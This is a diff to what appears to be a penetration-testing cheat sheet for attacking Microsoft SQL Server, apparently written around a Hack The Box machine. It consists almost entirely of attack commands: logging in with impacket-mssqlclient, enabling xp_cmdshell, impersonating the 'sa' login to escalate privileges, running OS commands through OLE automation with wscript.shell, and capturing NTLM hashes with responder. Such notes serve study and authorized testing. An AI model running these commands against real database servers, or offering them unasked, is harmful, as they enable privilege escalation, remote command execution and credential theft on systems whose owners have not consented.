@@ -464,6 +464,12 @@ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
 # help
 help
 
+# impersonate
+SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
+EXECUTE AS LOGIN = 'sa';
+## revert
+REVERT;
+
 # xp_cmdshell
 enable_xp_cmdshell
 
@@ -472,6 +478,13 @@ RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXECUTE xp_cmdshell 'whoami';
+
+# ole automation
+DECLARE @objShell INT;
+DECLARE @output varchar(8000);
+
+EXEC @output = sp_OACreate 'wscript.shell', @objShell Output;
+EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
 
 # NTLM
 responder -I tun0 
